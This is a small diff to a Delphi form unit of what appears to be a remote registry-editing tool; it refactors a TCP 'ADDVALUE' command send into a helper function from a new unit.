@@ -4,7 +4,7 @@ interface
 
 uses
   Windows, Classes, Controls, Forms,
-  Dialogs, StdCtrls, Buttons, IdTCPServer, gnugettext, sysutils;
+  Dialogs, StdCtrls, Buttons, IdTCPServer, gnugettext, sysutils, UnitFunciones;
 
 type
   TFormReg = class(TForm)
@@ -81,7 +81,7 @@ procedure TFormReg.BtnAceptarClick(Sender: TObject);
 begin
   if Servidor.Connection.Connected then
     begin
-      Servidor.Connection.WriteLn('ADDVALUE|' + Ruta + EditNombreValor.Text +
+      ConnectionWriteLn(Servidor,'ADDVALUE|' + Ruta + EditNombreValor.Text +
         '|' + Tipo + '|' + MemoInformacionValor.Text);
     end
   else
